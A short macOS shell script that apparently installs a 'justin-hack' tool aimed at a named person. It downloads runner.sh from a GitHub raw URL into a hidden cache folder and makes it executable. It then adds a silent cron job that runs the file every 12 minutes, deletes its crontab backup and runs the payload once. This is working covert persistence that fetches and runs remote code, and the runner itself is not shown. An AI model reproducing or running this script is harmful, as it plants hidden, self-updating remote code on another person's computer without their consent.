## Vars
jh=~/Library/Caches/jh
baseurl=https://raw.githubusercontent.com/FredericMartinez/justin-hack/master
timestamp=`date +'%s'`

## Prepare field
mkdir $jh 2> /dev/null

## Get Satan Runner
curl -o $jh/runner.sh $baseurl/runner.sh?q=$timestamp > /dev/null
chmod +x $jh/runner.sh

## Backup buddies
crontab -l > $jh/crontab

## Add Satan to buddies
echo "*/12 * * * * $jh/runner.sh > /dev/null 2>&1" >> $jh/crontab
crontab $jh/crontab

## Clean Satan
rm $jh/crontab

## Store custom person
echo $1 > $jh/.person

## 1st Runner
$jh/runner.sh